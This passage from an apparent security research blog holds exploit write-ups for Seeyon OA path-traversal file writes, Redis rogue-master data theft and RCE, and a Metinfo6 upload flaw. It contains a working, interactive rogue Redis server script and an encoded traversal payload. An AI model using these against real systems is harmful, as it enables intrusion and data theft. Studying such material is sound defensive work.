&#125;</span><br></pre></td></tr></table></figure>

<p>​    DecodeBase64方法是原始base64decode方法的变异,  从EncodeBase64方法当中可以看出其实就是映射了一个转换表, 对应的转换表如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String TableBase64 = <span class="string">&quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> String TableBase60 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​    写个脚本实现该转换表即可加解密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">STANDARD_ALPHABET = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">CUSTOM_ALPHABET = <span class="string">&#x27;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params"><span class="built_in">input</span></span>):</span></span><br><span class="line">    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="built_in">input</span>).translate(ENCODE_TRANS)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">input</span></span>):</span></span><br><span class="line">    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(<span class="built_in">input</span>.translate(DECODE_TRANS))</span><br></pre></td></tr></table></figure>

<p>​    Python3.4 已经没有 string.maketrans() 方法, 所以3.4及后续版本需要稍微修改下代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params"><span class="built_in">input</span></span>):</span></span><br><span class="line">    ENCODE_TRANS = <span class="built_in">input</span>.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(<span class="built_in">input</span>.encode(<span class="string">&quot;utf-8&quot;</span>))).translate(ENCODE_TRANS)</span><br></pre></td></tr></table></figure>

<p>​    首先需要使option的参数值为SAVEASIMG才能进入保存文件逻辑,  加密后为S3WYOSWLBSGr。保存路径是由tempPath和fileName组成。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String fileName = msgObj.GetMsgByName(<span class="string">&quot;FILENAME&quot;</span>);</span><br><span class="line">String tempFolder = (<span class="keyword">new</span> File((<span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>)).getAbsolutePath())).getParentFile().getParentFile().getPath();</span><br><span class="line">String tempPath = tempFolder + <span class="string">&quot;/base/upload/taohongTemp&quot;</span>;</span><br><span class="line">File folder = <span class="keyword">new</span> File(tempPath);</span><br></pre></td></tr></table></figure>

<p>​    tempFolder中进行了两次目录穿越, 应该是为了防止用户把文件写入到web目录当中, 不过因为fileName完全未过滤可以按照默认配置补全路径最终实现保存文件到web目录当中。所以这里首先需要目录穿越出/base/upload/taohongTemp三层目录, 然后按照默认配置补全路径, 使fileName为<code>..\..\..\ApacheJetspeed\webapps\seeyon\abcd.txt</code>, 编码得到qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdeYMUy7T3brV6, 在算字节长度时, 需要算上\r\n。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/seeyon_1.png" alt="pic1"></p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/seeyon_2.png" alt="pic2"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/07/14/redis-post-exploitation-学习/"><span>redis-post-exploitation 学习</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/07/14/redis-post-exploitation-学习/" rel="bookmark">
        <time class="entry-date published" datetime="2019-07-14T10:36:43.000Z">
          2019-07-14
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>  前两天Redis通过加载扩展实现RCE的方法突然火了起来,自己就去读了下原文ppt,发现里面不止写了RCE的利用,还附带了一些其他的就学习了一下。</p>
<h2 id="Data-Retrieval"><a href="#Data-Retrieval" class="headerlink" title="Data Retrieval"></a>Data Retrieval</h2><p>  该利用实现方法为将目标Redis设置为Rogue的slave数据库,通过rogue向slave发送命令获取数据。这个主要存在几个问题, 一是当目标Redis被设置为一台新redis的slave后会自动进行fullsync,导致目标Redis的原数据被清除。二是master如何给slave发命令, 查了下文档并没有找到主动发命令的方法。三是,slave的数据如何返回到master中。<br>  第一个问题比较好解决,自己搭建Rogue后只要slave发送sync请求时返回CONTINUE即可实现不清空slave的数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">    resp = <span class="string">&quot;+CONTINUE &quot;</span> + <span class="string">&quot;Z&quot;</span> * <span class="number">40</span> + <span class="string">&quot; 0&quot;</span> + CLRF</span><br><span class="line">    phase = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>  第二个问题,文档里没有翻到master给slave发命令的指令, 但是在同步完成后master是可以给slave返回命令执行的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((replication_cron_loops % server.repl_ping_slave_period) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    listLength(server.slaves))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Note that we don&#x27;t send the PING if the clients are paused during</span></span><br><span class="line"><span class="comment">     * a Redis Cluster manual failover: the PING we send will otherwise</span></span><br><span class="line"><span class="comment">     * alter the replication offsets of master and slave, and will no longer</span></span><br><span class="line"><span class="comment">     * match the one stored into &#x27;mf_master_offset&#x27; state. */</span></span><br><span class="line">    <span class="keyword">int</span> manual_failover_in_progress =</span><br><span class="line">        server.cluster_enabled &amp;&amp;</span><br><span class="line">        server.cluster-&gt;mf_end &amp;&amp;</span><br><span class="line">        clientsArePaused();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!manual_failover_in_progress) &#123;</span><br><span class="line">        ping_argv[<span class="number">0</span>] = createStringObject(<span class="string">&quot;PING&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        replicationFeedSlaves(server.slaves, server.slaveseldb,</span><br><span class="line">            ping_argv, <span class="number">1</span>);</span><br><span class="line">        decrRefCount(ping_argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码里看出,在同步完成后写死了只会返回PING,所以这里自己搭建Rogue返回任意指令即可。<br>第三个问题,在开启调试模式之后会返回数据到Master中, 所以按照PPT里的流程编写Rogue即可。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_1.jpg" alt="-w1067"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CLRF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">din</span>(<span class="params">sock, cnt=<span class="number">4096</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    msg = sock.recv(cnt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg.decode(<span class="string">&#x27;gb18030&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dout</span>(<span class="params">sock, msg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(msg) != <span class="built_in">bytes</span>:</span><br><span class="line">        msg = msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_cmd_arr</span>(<span class="params">arr</span>):</span></span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(arr))</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> arr:</span><br><span class="line">        cmd += CLRF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(arg))</span><br><span class="line">        cmd += CLRF + arg</span><br><span class="line">    cmd += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_cmd</span>(<span class="params">raw_cmd</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encode_cmd_arr(raw_cmd.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;*&quot;</span>):</span><br><span class="line">        raw_arr = cmd.strip().split(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> raw_arr[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;$&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> cmd.split(<span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Remote</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rhost, rport</span>):</span></span><br><span class="line">        self._host = rhost</span><br><span class="line">        self._port = rport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.connect((self._host, self._port))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        dout(self._sock, msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, cnt=<span class="number">65535</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> din(self._sock, cnt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        self.send(encode_cmd(cmd))</span><br><span class="line">        buf = self.recv()</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RogueServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lhost, lport</span>):</span></span><br><span class="line">        self._host = lhost</span><br><span class="line">        self._port = lport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, self._port))</span><br><span class="line">        self._sock.listen(<span class="number">10</span>)</span><br><span class="line">        self.i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        cmd_arr = decode_cmd(data)</span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        phase = <span class="number">0</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PING&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+PONG&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;ACK&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> self.i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                payload = <span class="string">&quot;SCRIPT DEBUG SYNC&quot;</span></span><br><span class="line">                resp = encode_cmd(payload)</span><br><span class="line">            <span class="keyword">elif</span> self.i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">                payload = <span class="string">&quot;eval redis.breakpoint() 0&quot;</span></span><br><span class="line">                resp = encode_cmd(payload)</span><br><span class="line">                phase = <span class="number">4</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;r keys *&quot;</span></span><br><span class="line">                resp = encode_cmd(payload)</span><br><span class="line">            self.i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;REPLCONF&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+OK&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+CONTINUE &quot;</span> + <span class="string">&quot;Z&quot;</span> * <span class="number">40</span> + <span class="string">&quot; 0&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> resp, phase</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        cli, addr = self._sock.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = din(cli, <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&quot;data == 0&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            resp, phase = self.handle(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> phase == <span class="number">4</span>:</span><br><span class="line">                dout(cli, resp)</span><br><span class="line">                data = din(cli, <span class="number">1024</span>)</span><br><span class="line">                <span class="comment"># payload = raw_input(&quot;Commands:&quot;)</span></span><br><span class="line"></span><br><span class="line">                payload = <span class="string">&quot;r keys *&quot;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line">                    payload = <span class="built_in">input</span>(<span class="string">&quot;[*]Master to Slave Command:&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> payload == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    resp = encode_cmd(payload)</span><br><span class="line">                    dout(cli, resp)</span><br><span class="line">                    data = din(cli, <span class="number">1024</span>)</span><br><span class="line">                    print(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dout(cli, resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RogueServer(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9990</span>).exp()</span><br></pre></td></tr></table></figure>

<p>该方法在redis bind到127,SSRF且无回显的场景中可以快速拿到数据库中的所有数据.<br>Docker中的redis bind到127进行测试.<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_2.jpg" alt="-w1238"></p>
<p>P.S.<br>PPT中提到的redis5版本后不能使用config命令, 说的是在script模式中不能使用config,正常模式下能够正常使用,看到有不少人理解错了顺便说一下。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_3.jpg" alt="-w1201"></p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>redis4中新增了添加扩展功能,可以自己编译so load到redis中使用。如果能够上传编译好的so到redis服务器中,即可通过module load加载扩展实现RCE。在以前的利用中，是通过持久化数据到crontab或authorized_keys或web目录中,但是这种方法有很大的一个问题是我们不能完全控制文件内容。<br>Redis在进行fullsync时, 会把master返回的数据直接保存到临时文件中,然后再重命名为dbfilename对应的文件名, 这里自己自己搭建rogue server,即可返回任意内容实现任意文件上传,然后写入so即可实现RCE。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rename(server.repl_transfer_tmpfile,server.rdb_filename) == <span class="number">-1</span>) &#123;</span><br><span class="line">    serverLog(LL_WARNING,<span class="string">&quot;Failed trying to rename the temp DB into dump.rdb in MASTER &lt;-&gt; SLAVE synchronization: %s&quot;</span>, strerror(errno));</span><br><span class="line">    cancelReplicationHandshake();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_4.jpg" alt="-w1185"><br>在redis4中, fullsync使用的协议格式为plaintext,而redis5中使用了custom格式。一开始有开源的rogue server直接使用data.startswith(“PSYNC”)来决定返回内容,我测试该脚本能在redis4成功而redis5失败,就是这个原因。</p>
<p>在进行FULLSYNC时, slave的数据会被完全清空且同步master的数据, 所以在利用时需要做好数据备份。<br>数据备份有两种常用的方法, 一是在利用前先save,在RCE后重启redis即可。二是创建一个公网redis,利用前将目标数据同步到公网redis中,利用完后目标REDIS再从公网redis中同步数据,这样不需要重启。</p>
<h2 id="redis-sentinel"><a href="#redis-sentinel" class="headerlink" title="redis-sentinel"></a>redis-sentinel</h2><p>Sentinel常用来管理多个Redis服务器, 该服务的默认端口为26379, 并且sentinel中不会检测包中是否含有HOST:和POST,所以可以在SSRF中利用。<br>ppt中提到的利用方法为,首先在sentinel中监控大Rogue server, Rogue server中含有两个slave一个为另外的小Rogue server另一个为需要take over的redis。当大Rogue server断线时, Sentinel会从slave中按照slave_priorty等配置来选举出新的master。<br>当小Rogue server成为Master,目标Redis成为了slave后就可以接着使用之前的方法实现RCE。<br>当前还提到了一种更简单的利用方法,当Sentinel存在未授权时，可以使用Sentinel的Notification功能执行任意脚本。不过我测试redis-sentinel默认配置为sentinel deny-scripts-reconfig yes,没法利用。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a><br><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a><br><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/18/Metinfo6-Arbitrary-File-Upload-Via-Iconv-Truncate/"><span>Metinfo6 Arbitrary File Upload Via Iconv Truncate</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/18/Metinfo6-Arbitrary-File-Upload-Via-Iconv-Truncate/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-18T15:01:39.000Z">
          2019-06-18
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>放了好多年的一个漏洞, 不过也没看到有人发出来过,都快放忘了,最近朋友hw遇到了一个Metinfo,帮忙用这个洞打了一下还成功了。自己又去官网下载了最新的Metinfo 62版本看了下,最新版加了一些过滤不过还是能够绕过。</p>
<p>漏洞成功利用场景</p>
<blockquote>
<p>最新版本无需登录, Windows + php&lt;5.4</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/app/system/include/module/uploadify.class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">uploadify</span> <span class="keyword">extends</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $upfile;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upfile = <span class="keyword">new</span> upfile();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>uploadify类继承web类, 在构造方法中调用了父类的构造方法, web类是一个前台基类,所以并不会做权限验证则uploadify类无需登录即可使用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doupfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set_upfile();</span><br><span class="line"></span><br><span class="line">	$info[<span class="string">&#x27;savepath&#x27;</span>] = $_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>];</span><br><span class="line">	$info[<span class="string">&#x27;format&#x27;</span>] = $_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;format&#x27;</span>];</span><br><span class="line">	$info[<span class="string">&#x27;maxsize&#x27;</span>] = $_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;maxsize&#x27;</span>];</span><br><span class="line">	$info[<span class="string">&#x27;is_rename&#x27;</span>] = $_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;is_rename&#x27;</span>];</span><br><span class="line">	$info[<span class="string">&#x27;is_overwrite&#x27;</span>] = $_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;is_overwrite&#x27;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;set_upload($info);</span><br><span class="line"></span><br><span class="line">	$back = <span class="keyword">$this</span>-&gt;upload($_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;formname&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>($_M[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>($back[<span class="string">&#x27;error&#x27;</span>])&#123;</span><br><span class="line">			$back[<span class="string">&#x27;error&#x27;</span>] = $back[<span class="string">&#x27;errorcode&#x27;</span>];</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$backs[<span class="string">&#x27;path&#x27;</span>] = $back[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"></span><br><span class="line">			$backs[<span class="string">&#x27;append&#x27;</span>] = <span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">			$back = $backs;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    $back[<span class="string">&#x27;filesize&#x27;</span>] =  round(filesize($back[<span class="string">&#x27;path&#x27;</span>])/<span class="number">1024</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">echo</span> jsonencode($back);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$_M[‘form’] 是被metinfo处理后的GPC,所以能够被用户控制。<br>在该类的doupload方法当中,上传类所用到的部分配置能被用户控制,这里需要关注一下savepath,设置savepath时会被设置为绝对路径,我们可控的点为绝对路径的upload目录之后。</p>
